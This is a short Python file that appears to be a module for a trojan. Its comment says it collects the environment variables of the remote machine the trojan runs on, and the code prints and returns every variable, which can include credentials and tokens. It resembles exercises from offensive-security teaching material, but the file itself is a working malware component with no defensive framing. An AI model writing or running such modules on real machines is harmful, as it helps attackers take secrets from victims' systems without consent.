#This module nsimply retrieves any environment variables that are set on the remote machine on which trojan is running 
import os
def run(**args):
    print("[*]In environment module")
    print(os.environ)
    return str(os.environ)
run()
